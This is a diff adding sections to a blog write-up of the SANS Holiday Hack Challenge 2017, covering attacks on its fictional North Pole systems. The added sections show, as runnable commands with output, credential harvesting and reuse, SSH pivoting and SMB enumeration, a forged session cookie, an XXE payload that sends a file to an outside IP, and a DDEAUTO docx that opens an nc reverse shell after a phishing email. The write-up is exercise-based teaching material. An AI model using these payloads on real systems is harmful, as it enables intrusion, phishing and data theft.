@@ -809,9 +809,30 @@ elf@a9a5df40cd29:~$ LD_PRELOAD="$PWD/hacking_time" ./isit42
 
 The Santa Web Attacks are the core of the SANS Holiday Hack Challenge, the structure was quite unknown from the get go, as we were give some basic information about the systems we would be attacking. The idea was you would find things as you progressed that would help you with the next challenge and so on.
 
-**NOTE:** Question 1 was technically covered in the  the introduction levels in the North Pole and Beyond world. The **GreatBookPage1.pdf** was obtained by rolling the snowball over the page. The title of that page was "About This Book..."
+#### Optional Hints
 
-**NOTE:** For completeness I'll also mention **GreatBookPage5.pdf** was obtained in `Bumbles Bounce` level by rolling a snowball over the page. The title of that page was "The Abominable Snow Monster"
+There was a couple hints that were granted to us throughout the series of these and the previous North Pole and Beyond world challenges. A number were available as unlockables for completing the snowball challenges, whilst the rest were posted by a series of festive twitter accounts under the following list of handles.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-twitter-accounts.jpg" />
+
+* Wunorse Openslae: https://twitter.com/1Horse1OSSleigh
+* Pepper Minstix: https://twitter.com/PepperyGoodness
+* Bushy Evergreen: https://twitter.com/GreenestElf
+* SugerPlum Mary: https://twitter.com/ThePlumSweetest
+* Shinny Upatree: https://twitter.com/ClimbALLdaTrees
+* Sparkle Redberry: https://twitter.com/GlitteryElf
+* Holly Evergreen: https://twitter.com/GreenesterElf
+* Minty Candycane: https://twitter.com/SirMintsALot
+
+For as much of the challenges that followed I would occasionally refer to these hint pages, along with the occasional chit-chat with people on the [CentralSec Slack](https://centralsec.slack.com).
+
+#### Great Pages
+
+Throughout the challenges there were 7 great pages to collect that would tell a festive tail. 5/7 of these pages are found in the following answers, however the two listed below are ones found from the North Pole and Beyond world search.
+
+* Question 1 was technically covered in the  the introduction levels in the North Pole and Beyond world. The **[GreatBookPage1.pdf](/misc/2017/12/GreatBookPage1.pdf)** was obtained by rolling the snowball over the page. The title of that page was "About This Book..."
+
+* **[GreatBookPage5.pdf](/misc/2017/12/GreatBookPage5.pdf)** was obtained in `Bumbles Bounce` level by rolling a snowball over the page. The title of that page was "The Abominable Snow Monster"
 
 ### Letters to Santa
 
@@ -871,6 +892,110 @@ And the listener suddenly filled up with a script prompt, giving me remote acces
 
 <img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge01-struts-exploit-listener.jpg" />
 
+Having access to the server, the first thing I set my sights on was finding the Great book page on the web server. I checked the usual spot for the `www` config in `/var/www/html/` where I found the root location of the original letters 2 santa website.
+
+```bash
+alabaster_snowball@l2s:/tmp/asnow.kyweXWGHZ8tJgJSjh5qurHmR$ cd /var/www/html/
+cd /var/www/html/
+
+alabaster_snowball@l2s:/var/www/html$ ls
+ls
+
+css
+fonts
+GreatBookPage2.pdf
+imgs
+index.html
+js
+process.php
+alabaster_snowball@l2s:/var/www/html$
+```
+
+It was here I found the GreatBookPage2.pdf file. I checked, and confirmed that I could download the page from https://l2s.northpolechristmastown.com/GreatBookPage2.pdf.
+
+The Books title was **On the Topic of Flying Animals**.
+
+The next part of the challenge was to find Alabaster Snowball's password. I knew that the username was `alabaster_snowball`, so it gave me a search parameter to start with. I tried using the find command first to find instances with `alabaster_snowball` on the file system. I also guessed that it's likely the password; if anywhere would be placed inside a file somewhere.
+
+```bash
+alabaster_snowball@l2s:/tmp/asnow.10X4HkAZntmGtaJknhZpqM3X$ /usr/bin/find / -type f -exec grep -l "alabaster_snowball" {} \;
+```
+
+I waited, and waited and waited... but no results were coming up at all. Eventually I started getting thousands and thousands of Permission denied messages, which was the find command unable to read the files it was encountering.
+
+```bash
+grep: /proc/52/stack: Permission denied
+grep: /proc/52/io: Permission denied
+grep: /proc/52/timerslack_ns: Operation not permitted
+/usr/bin/find: ‘/proc/54/task/54/fd’: Permission denied
+/usr/bin/find: ‘/proc/54/task/54/fdinfo’: Permission denied
+/usr/bin/find: ‘/proc/54/task/54/ns’: Permission denied
+...
+```
+
+I decided to check some of the hints I had unlocked and found the one that was relevant to me under the [Stockings page](https://2017.holidayhackchallenge.com/stocking) on the challenge website
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge01-hint8.jpg" />
+
+The key things I took from this chucky bit of info was that:
+
+* **Alabaster Snowball** has probably put his password in a config file for the website
+* The website config files or possibly another service like **FTP** or a **database** might be hiding his password.
+
+I went ahead and checked the /opt/ directory for what 3rd party software of services have been installed, and was excited to see `apache-tomcat` listed there along with the jre (Java Runtime Environment).
+
+```bash
+alabaster_snowball@l2s:/tmp/asnow.SC6mOMPUGRwo4KRcsJSwL7w0$ cd /opt
+cd /opt
+
+alabaster_snowball@l2s:/opt$ ls -al
+
+ls -al
+total 16
+drwxr-xr-x  4 root               root               4096 Oct 13 01:47 .
+drwxr-xr-x 24 root               root               4096 Jan  9 08:02 ..
+drwxrwxrwx  9 alabaster_snowball alabaster_snowball 4096 Nov 29 14:42 apache-tomcat
+drwxrwxrwx  6 alabaster_snowball alabaster_snowball 4096 Oct 12 14:48 jre
+```
+
+I ran the same command I did before, now with a limited search term on the `/opt/apache-tomcat` directory and got a hit!
+
+```bash
+alabaster_snowball@l2s:~$ /usr/bin/find /opt/apache-tomcat -type f -exec grep -l "alabaster_snowball" {} \;
+<at -type f -exec grep -l "alabaster_snowball" {} \;
+
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class
+```
+
+I opened up the `/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class` file and found the following lines revealing Alabasters password
+
+```bash
+alabaster_snowball@l2s:~$ cat /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class
+
+<-INF/classes/org/demo/rest/example/OrderMySql.class
+    public class Connect {
+            final String host = "localhost";
+            final String username = "alabaster_snowball";
+            final String password = "stream_unhappy_buy_loss";
+            String connectionURL = "jdbc:mysql://" + host + ":3306/db?user=;password=";
+            Connection connection = null;
+            Statement statement = null;
+```
+
+I then confirmed the credentials by `ssh`ing onto the server from my kali system
+
+```bash
+# root at nathan-mbp-kali in ~ [17:53:46]
+→ ssh alabaster_snowball@l2s.northpolechristmastown.com
+alabaster_snowball@l2s.northpolechristmastown.com's password: stream_unhappy_buy_loss
+
+alabaster_snowball@l2s:/tmp/asnow.i4LL0EEXNF2uU9gZtYX2HZ3q$
+```
+
+**Username:** alabaster_snowball
+
+**Password:** stream_unhappy_buy_loss
+
 **References:**
 
 [Why You Need the Skills to Tinker with Publicly Released Exploit Code](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code)
@@ -881,10 +1006,282 @@ And the listener suddenly filled up with a script prompt, giving me remote acces
 
 **Task:** The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?
 
+With access to Alabaster's account now safely in my mitts, I began performing some reconnaissance on the neighbouring systems to see if I can get any information out of them. I was happy to see that `nmap` was an available command on the system and ran the following command to extract the various systems on the internal network
+
+```bash
+alabaster_snowball@l2s:/tmp/asnow.i4LL0EEXNF2uU9gZtYX2HZ3q$ nmap -Pn 10.142.0.0/24
+```
+
+Below is a diagram overview I did up for the systems captured by this scan.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge02-recon.jpg" />
+
+It was interesting to note that `hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)` required the deep `-Pn` nmap scan, as it wasn't responding to any quick scan techniques.
+
+Now that I knew the systems I could exploit, I looked back at what the challenge was asking for. I needed to connect to the SMB server (which I'd just found on `10.142.0.7`) and extract the contents of a mapped share through Enumeration methods.
+
+I used the nmap script `smb-enum-shares` to see what I could find out about the system in question.
+
+```bash
+alabaster_snowball@l2s:/tmp/asnow.i4LL0EEXNF2uU9gZtYX2HZ3q$ nmap -T4 -v --script smb-enum-shares --script-args smbuser=alabaster_snowball,smbpass=stream_unhappy_buy_loss -p445 10.142.0.7
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-09 10:26 UTC
+
+NSE: Loaded 1 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 10:26
+Completed NSE at 10:26, 0.00s elapsed
+Initiating Ping Scan at 10:26
+Scanning 10.142.0.7 [2 ports]
+Completed Ping Scan at 10:26, 2.00s elapsed (1 total hosts)
+Nmap scan report for 10.142.0.7 [host down]
+NSE: Script Post-scanning.
+Initiating NSE at 10:26
+Completed NSE at 10:26, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+Nmap done: 1 IP address (0 hosts up) scanned in 2.27 seconds
+```
+
+Unfortunately my probe requests were being ignored, and even adding `-Pn` to this command wasn't working well. I checked the system for any binaries relating to SMB but came up completely empty handed.
+
+I checked some of the hints on the Stocking page again and found the following relating to ssh port forwarders.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge02-hint6.jpg" />
+
+I searched around and tried a couple variations of the command expression before stumbling across this incredibly well explained answer to the question from user [erik on unix.stackexchange](https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot). I've summarized the awesome post into a small diagram that shows how I can use the web servers open ssh on `l2s.northpolechristmastown.com` to forward SMB requests to port 445 on my local system to a remote system on `10.142.0.7`
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge02-ssh-forwarding.jpg" />
+
+The final command I used was the following, making sure to auth with `alabaster_snowball / stream_unhappy_buy_loss` whenever prompted
+
+```bash
+$ ssh -L 127.0.0.1:445:10.142.0.8:445 alabaster_snowball@l2s.northpolechristmastown.com
+
+alabaster_snowball@l2s.northpolechristmastown.com's password: stream_unhappy_buy_loss
+alabaster_snowball@l2s:/tmp/asnow.mECTF2MgYqC2D2Okx1IYVswB$
+```
+
+Once connected to this SSH session, I could test to see If I was forwarding correctly by using the `smbclient` command along with Alabaster Snowball's credentials to authenticate
+
+```bash
+$ smbclient -L 127.0.0.1 -U alabaster_snowball
+
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\alabaster_snowball's password: stream_unhappy_buy_loss
+session setup failed: NT_STATUS_LOGON_FAILURE
+```
+
+It seemed like the SMB serve was rejecting my request, likely due to the 127.0.0.1 forwarder not being a valid NetBIOS name on the destination system.
+
+Instead I used the following command, using the `-I` flag to specify the IP address of the target server so I could call the NetBIOS name in the share name.
+
+```bash
+$ smbclient -L HHC17-SMB-SERVE -I 127.0.0.1 -U alabaster_snowball
+```
+
+This still didn't resolve the issue, so I went back to the list of services on that system to see if I was possibly missing something.
+
+```bash
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+```
+
+I realised that I wasn't forwarding `port 139` (Which handles NetBIOS sessions).
+
+I also found out that I could forward multiple ports over ssh by simply adding multiple `-L` arguments, so I went ahead a made up this command to handle the connections to all 4 ports on the system.
+
+```bash
+$ ssh -L 127.0.0.1:135:10.142.0.7:135 -L 127.0.0.1:139:10.142.0.7:139 -L 127.0.0.1:445:10.142.0.7:445 -L 127.0.0.1:3389:10.142.0.7:3389 alabaster_snowball@l2s.northpolechristmastown.com
+```
+
+Going back and trying the `smbclient` command again and was happy to see I had much more success now
+
+```bash
+$ smbclient -L HHC17-SMB-SERVE -I 127.0.0.1 -U alabaster_snowball
+
+Enter WORKGROUP\alabaster_snowball's password: stream_unhappy_buy_loss
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	FileStor        Disk
+	IPC$            IPC       Remote IPC
+```
+
+The share that stood out to me was **FileStor**, so I went ahead and used the following command to connect to this share over `smbclient` again.
+
+*NOTE: The use of the `\` in front of each backslash is to override the escape character that this key usually invokes*
+
+```bash
+smbclient \\\\HHC17-SMB-SERVE\\FileStor -I 127.0.0.1 -U alabaster_snowball
+
+Enter WORKGROUP\alabaster_snowball's password: stream_unhappy_buy_loss
+
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Thu Dec  7 05:51:46 2017
+  ..                                  D        0  Thu Dec  7 05:51:46 2017
+  BOLO - Munchkin Mole Report.docx      A   255520  Thu Dec  7 05:44:17 2017
+  GreatBookPage3.pdf                  A  1275756  Tue Dec  5 03:21:44 2017
+  MEMO - Calculator Access for Wunorse.docx      A   111852  Tue Nov 28 03:01:36 2017
+  MEMO - Password Policy Reminder.docx      A   133295  Thu Dec  7 05:47:28 2017
+  Naughty and Nice List.csv           A    10245  Fri Dec  1 03:42:00 2017
+  Naughty and Nice List.docx          A    60344  Thu Dec  7 05:51:25 2017
+
+		13106687 blocks of size 4096. 9624477 blocks available
+```
+
+Fantastic! I'd stumbled across the motherload of files. I used the `smbget` command to pull all these files across to my local system
+
+```bash
+$ smbget -R smb://127.0.0.1/FileStor -U alabaster_snowball
+
+Password for [alabaster_snowball] connecting to //FileStor/127.0.0.1: stream_unhappy_buy_loss
+Using workgroup WORKGROUP, user alabaster_snowball
+
+smb://127.0.0.1/FileStor/BOLO - Munchkin Mole Report.docx
+smb://127.0.0.1/FileStor/GreatBookPage3.pdf
+smb://127.0.0.1/FileStor/MEMO - Password Policy Reminder.docx
+smb://127.0.0.1/FileStor/Naughty and Nice List.csv
+smb://127.0.0.1/FileStor/Naughty and Nice List.docx
+
+Downloaded 1.65MB in 25 seconds
+```
+
+To conclude this challenge:
+
+* File Server name is **hhc17-smb-server**.c.holidayhack2017.internal
+* The File Share name is **FileStor**
+* The **[GreatBookPage3.pdf](/misc/2017/12/GreatBookPage3.pdf)** title is **The Great Schism**
+
+**References:**
+
+[SSH/OpenSSH/PortForwarding](https://help.ubuntu.com/community/SSH/OpenSSH/PortForwarding)
+
+[Introduction to pivoting, Part 1: SSH](https://blog.techorganic.com/2012/10/06/introduction-to-pivoting-part-1-ssh/)
+
+[What's ssh port forwarding and what's the difference between ssh local and remote port forwarding](https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot)
 
 ### Elf Web Access
 
 **Task:** Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?
+
+Moving quickly along, Elf Web Access was the next task on http://mail.northpolechristmastown.com. The goal was to simply find *The Great Book* page on the email server.
+
+I started off by running my ssh forwarder for this system
+
+```bash
+$ ssh -L 127.0.0.1:25:10.142.0.5:25 -L 127.0.0.1:80:10.142.0.5:80 -L 127.0.0.1:143:10.142.0.5:143 -L 127.0.0.1:2525:10.142.0.5:2525 -L 127.0.0.1:3000:10.142.0.5:3000 alabaster_snowball@l2s.northpolechristmastown.com
+```
+
+Then I fired up the Web page to see if I could see anything interesting. At the same time I started up OWASP ZAP and set it up to proxy my traffic on port 8081. This would allow me to capture all the various request made to and received from the web server as I explored.
+
+When I attempted a login, I noted that a POST was made to `http://mail.northpolechristmastown.com/login.js` with the attributes of my email and password field.
+
+```bash
+POST http://mail.northpolechristmastown.com/login.js HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Referer: http://mail.northpolechristmastown.com/
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 35
+Cookie: EWA={"name":"GUEST","plaintext":"","ciphertext":""}
+Connection: keep-alive
+Host: mail.northpolechristmastown.com
+```
+
+It was also interesting to see a Cookie called EWA was forwarded as well with a `name`, `plaintext` and `ciphertext` field.
+
+I continued exploring and found a fun entry in the `/robots.txt` file on the server.
+
+```bash
+User-agent: *
+Disallow: /cookie.txt
+```
+
+Navigating to this page (mail.northpolechristmastown.com/cookie.txt) and I found what looked like the javascript cipher that was used to make the cookie.
+
+```js
+//FOUND THESE FOR creating and validating cookies. Going to use this in node js
+    function cookie_maker(username, callback){
+        var key = 'need to put any length key in here';
+        //randomly generates a string of 5 characters
+        var plaintext = rando_string(5)
+        //makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters
+        //Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.
+        var ciphertext = aes256.encrypt(key, plaintext).replace(/\=/g,'');
+        //Setting the values of the cookie.
+        var acookie = ['IOTECHWEBMAIL',JSON.stringify({"name":username, "plaintext":plaintext,  "ciphertext":ciphertext}), { maxAge: 86400000, httpOnly: true, encode: String }]
+        return callback(acookie);
+    };
+    function cookie_checker(req, callback){
+        try{
+            var key = 'need to put any length key in here';
+            //Retrieving the cookie from the request headers and parsing it as JSON
+            var thecookie = JSON.parse(req.cookies.IOTECHWEBMAIL);
+            //Retrieving the cipher text
+            var ciphertext = thecookie.ciphertext;
+            //Retrievingin the username
+            var username = thecookie.name
+            //retrieving the plaintext
+            var plaintext = aes256.decrypt(key, ciphertext);
+            //If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key
+            if (plaintext === thecookie.plaintext) {
+                return callback(true, username);
+            } else {
+                return callback(false, '');
+            }
+        } catch (e) {
+            console.log(e);
+            return callback(false, '');
+        }
+    };
+
+```
+
+This particular task took a very long time to work out. Initially I thought I'd have to reverse engineer the cipher, however I didn't have access to a valid cookie so I wasn't able to get far with this. Eventually the following lines stood out and I was able to crack it!
+
+```js
+When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters
+```
+
+16 bytes is how much space we have for the cipher text.
+
+```js
+var ciphertext = aes256.encrypt(key, plaintext).replace(/\=/g,'');
+```
+
+The cipher text is equal to the `aes256` encrypted plaintext value is `XOR`ed with 0, so using a full 16 byte value will result in an output cipher text of a `null bytes`, then stripped of its space characters leveling an empty `""`
+
+Using this knowledge you can create a cookie with a full 16 bytes as the cyphertext `AAAAAAAAAAAAAAAAAAAAAA` and leave the plaintext value as `""`. Then you simply substitute in the email address in the name field and send this cookie off.
+
+```bash
+curl -XPOST -sL "http://mail.northpolechristmastown.com:3000/api.js" -d "getmail=getmail" -H "Cookie: EWA={\"name\":\"alabaster.snowball@northpolechristmastown.com\",\"plaintext\":\"\",\"ciphertext\":\"AAAAAAAAAAAAAAAAAAAAAA\"}"
+
+{"INBOX":[{"HEADERS":{"which":"HEADER","size":920,"body":{"return-path":["<admin@northpolechristmastown.com>"],"delivered-to":["alabaster.snowball@northpolechristmastown.com"],"received":["from localhost (localhost [127.0.0.1])\tby mail.northpolechristmastown.com (Postfix) with ESMTP id 4CFA8BD745\tfor <alabaster.snowball@northpolechristmastown.com>; Wed,  8 Nov 2017 16:01:02 +0000 (UTC)","from mail.northpolechristmastown.com ([127.0.0.1])\tby localhost (mail.northpolechristmastown.com [127.0.0.1]) (amavisd-new, port 10024)\twith ESMTP id IsBXKyYpc5sC\tfor <alabaster.snowball@northpolechristmastown.com>;\tWed,  8 Nov 2017 16:01:02 +0000 (UTC)"],"to":["alabaster.snowball@northpolechristmastown.com"]
+
+etc...
+```
+
+This returned the full inbox of Alabaster. Now that I knew it could work, I simply created a fake cookie with this same information and loaded it into Firefox.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge03-cookie.jpg" />
+
+Refreshing the `http://mail.northpolechristmastown.com` after the cookie was loading resulted in a redirect to `http://mail.northpolechristmastown.com/account.html` and the ability to view Alabaster's entire inbox.
+
+Reading through all the emails, I could tell some of this information was likely to come in handy later on, however all this challenge required at present was the title of GreatBookPage4.pdf which I found to be located in the last email in the inbox.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge03-greatbookpage4.jpg" />
+
+I could navigate to the url `http://mail.northpolechristmastown.com/attachments/GreatBookPage4_893jt91md2.pdf` and download a copy of **[GreatBookPage4.pdf](/misc/2017/12/GreatBookPage4.pdf)**. The title of this page was **The Rise of the Lollipop Guild**.
+
+The page explains that a ``Terrorist group called The Lollipop Guild`` is likely to have infiltrated the elven population and are living amongst those small little toymaker living in the North Pole. The terrorists living in society are called ``Munchkin Moles``. These are just rumors, but is it so hard to believe?
 
 ### Naughty and Nice List
 
@@ -894,10 +1291,175 @@ And the listener suddenly filled up with a script prompt, giving me remote acces
 
 **Task:** The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from **C:\greatbook.txt**. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?
 
+Onto the next platform/question and I again started off by loading in the ssh forwarder command and connecting to the web interface.
+
+```bash
+$ ssh -L 127.0.0.1:80:10.142.0.13:80 -L 127.0.0.1:3389:10.142.0.13:3389 alabaster_snowball@l2s.northpolechristmastown.com
+```
+
+To remove complexity I also added a new entry to my `/etc/hosts` file for `eaas.northpolechristmastown.com`
+
+The goal for this challenge was to retrieve the `greatbook.txt` file from `C:\` directory on the EAAS server.
+
+I checked out the website while running OWASP ZAP and noted that the halfway down the page there was a download link to an Elf ordering form http://eaas.northpolechristmastown.com/XMLFile/Elfdata.xml
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge05-xml-download.jpg" />
+
+The order form read as follows
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<Elf>
+   <Elf>
+      <ElfID>1</ElfID>
+      <ElfName>Elf On a Shelf</ElfName>
+      <Contact>8675309</Contact>
+      <DateOfPurchase>11/29/2017 12:00:00 AM</DateOfPurchase>
+      <Picture>1.png</Picture>
+      <Address>On a Shelf, Obviously</Address>
+   </Elf>
+   <Elf>
+      <ElfID>2</ElfID>
+      <ElfName>Buddy the Elf</ElfName>
+      <Contact>8675309</Contact>
+      <DateOfPurchase>11/29/2017 12:00:00 AM</DateOfPurchase>
+      <Picture>2.png</Picture>
+      <Address>New York City</Address>
+   </Elf>
+etc...
+```
+
+Further inspection of the homepage led me to find that you could view the output of this order form on the http://eaas.northpolechristmastown.com/Home/DisplayXML page.
+
+There was also an **Browse Upload** button which when supplied an XML file, would be uploaded and used as the new Elf database displayed on this page
+
+I came across a recent along post on the [SANS blog that explained the dangers of External EML entries](https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities).
+
+The exploit works because IIS will quite happily parse an external (remote) ENTITY using the `%extentity` method. To run this exploit I created a file on my server that was available to connect to with the following contents called `evil.dtd`
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
+<!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 'http://203.59.106.231:9002/?%stolendata;'>">
+```
+
+Note that under the `5stolendata` function that would be invoked by `%inception` I had the file path for the **greatbook.txt**
+
+I served up this file over a `Python SimpleHTTPServer` session on `port 9002`
+
+```bash
+$ python -m SimpleHTTPServer 9002
+Serving HTTP on 0.0.0.0 port 9002 ...
+```
+
+I then created a new replacement `Elfdata.xml` file with the following contents and uploaded it to the EAAS browse field
+
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE demo [
+     <!ELEMENT demo ANY >
+     <!ENTITY % extentity SYSTEM "http://203.59.106.231:9002/evil.dtd">
+     %extentity;
+     %inception;
+     %sendit;
+      ]
+>
+```
+
+I confirmed the successful POST via OWASP ZAP
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge05-xml-upload.jpg" />
+
+The upload also resulted in two requests hitting my HTTP server
+
+* One downloaded evil.dtd
+* The other appended the contents of C:\greatbook.txt to a GET request
+
+```bash
+$ python -m SimpleHTTPServer 9002
+
+Serving HTTP on 0.0.0.0 port 9002 ...
+35.185.118.225 - - [09/Jan/2018 20:33:29] "GET /evil.dtd HTTP/1.1" 200 -
+35.185.118.225 - - [09/Jan/2018 20:33:30] "GET /?http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf HTTP/1.1" 200 -
+```
+
+Navigating to http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf resulted in the successful aquisition of **[GreatBookPage6.pdf](/misc/2017/12/GreatBookPage6.pdf)**
+
+The tile of the newly found page was **The Dreaded Inter-Dimensional Tornadoes**
+
+**References:**
+
+[Exploiting XXE Vulnerabilities in IIS/.NET](https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities)
+
 ### Elf-Machine Interfaces
 
 **Task:** Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI) to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from **C:\GreatBookPage7.pdf**. What does The Great Book page describe?
 
+The challenge here required some backtracking to the mail server and seeing what other information we could extract. I started off applying the ssh forwarder as usually and also added in the login cookie that was explained in the mail server breach challenge
+
+```bash
+$ ssh -L 127.0.0.1:25:10.142.0.5:25 -L 127.0.0.1:80:10.142.0.5:80 -L 127.0.0.1:143:10.142.0.5:143 -L 127.0.0.1:2525:10.142.0.5:2525 -L 127.0.0.1:3000:10.142.0.5:3000 alabaster_snowball@l2s.northpolechristmastown.com
+```
+
+Reading over all the emails brought to light a few things:
+
+* Alabaster is a Hypocrite and should not be working in Security.
+* Alabaster mentions that he has `netcat` installed on his system and also mentions PowerShell.
+* Tarpin McJingle Hauser emails `all@` saying she's going to be sending out a recipe file with the words `gingerbread`, `cookie` and `recipe` in the email. She also said it will be in a `.docx` file. Oddly specific...
+* Alabaster says, and I quote: **"please send it to me in a docx file. Im currently working on my computer and would download that to my machine, open it, and click to all the prompts."**
+* Finally there was a link to a png file at http://mail.northpolechristmastown.com/attachments/dde_exmaple_minty_candycane.png that can be seen below.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge06-dde-image.jpg" />
+
+I did some research on DDE (Dynamic Data Exchange), and came across this resource that walked through the process of creating your own reverse shell exploit using DDE loaded into a `.docx` file.
+
+I created a new `.docx` file and filled it with the following content
+
+```bash
+{DDEAUTO c:\\windows\\system32\\cmd "/k nc.exe 203.59.106.231 9001 -e cmd.exe"}
+```
+
+This DDE command when executing will open up a `command line shell` back to my server on port `9001`.
+
+Next I logged into the mail system again, this time as `jessica.claus@northpolechristmastown.com` (just in case Alabaster is smart enough to notice an email from himself that he didn't send). I drafted up a new email to `alabaster.snowball@northpolechristmastown.com` with the following content and attached the file to the email with my DDE exploit.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge06-dde-send-email.jpg" />
+
+I also came up with a handy little curl command to do this process for me once the word doc was uploaded.
+
+```bash
+curl -i -s -k -X  'POST'  \
+ -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'  -H 'Accept: */*'  -H 'Accept-Language: en-US,en;q=0.5'  -H 'Referer: http://mail.northpolechristmastown.com/account.html'  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'  -H 'X-Requested-With: XMLHttpRequest'  -H 'Content-Length: 519'  -H 'Cookie: EWA={"name":"jessica.claus@northpolechristmastown.com","plaintext":"","ciphertext":"AAAAAAAAAAAAAAAAAAAAAA"}'  -H 'Connection: keep-alive'  -H ''  \
+--data-binary $'from_email=jessica.claus%40northpolechristmastown.com&to_email=alabaster.snowball%40northpolechristmastown.com&subject_email=gingerbread+cookie+recipe&message_email=67696e676572627265616420636f6f6b6965207265636970650a41545441434845442046494c4520444f574e4c4f414420484552453a20687474703a2f2f6d61696c2e6e6f727468706f6c656368726973746d6173746f776e2e636f6d2f6174746163686d656e74732f4439464668354f694f70617972754d45316d35596d6e616338576736586c62566542586f5372556842796d457972414772545f5f436f6f6b69655265636970652e646f63780a20' \
+'http://mail.northpolechristmastown.com:3000/api.js'
+```
+
+Before uploading, I made sure to start a `nc` listener on port `9001`
+
+```bash
+$ nc -lvp 9001
+listening on [any] 9001 ...
+```
+
+I send the email and about 10 seconds later a session open up!
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge06-dde-reverse-shell.jpg" />
+
+I quickly navigated the file system and located where the GreatBookPage7.pdf was. I opened up another `nc` listener on my system on port `9002` and then using the following (Windows on top, listener on bottom) exfiltrated the pdf.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge06-great-book-nc.jpg" />
+
+The **[GreatBookPage7.pdf](/misc/2017/12/GreatBookPage7.pdf)** has a titl of **Regarding the Bitches of Oz** (though the Font is hard to read, and might just be Witches) describes the background of the Witches of Oz. During the Great Schism, the witches deliberately didn't take a side and remained neural.
+
+**References:**
+
+[Macro-less Code Exec in MSWord](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/)
+
+[Abusing DDE in Microsoft Word 2016](http://ethicalredteam.com/pages/dde.php)
+
+[OFFICE DDEAUTO Payload Generation script](https://github.com/xillwillx/CACTUSTORCH_DDEAUTO)
+
 ### North Pole Elf Database
 
 **Task:** Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?
+
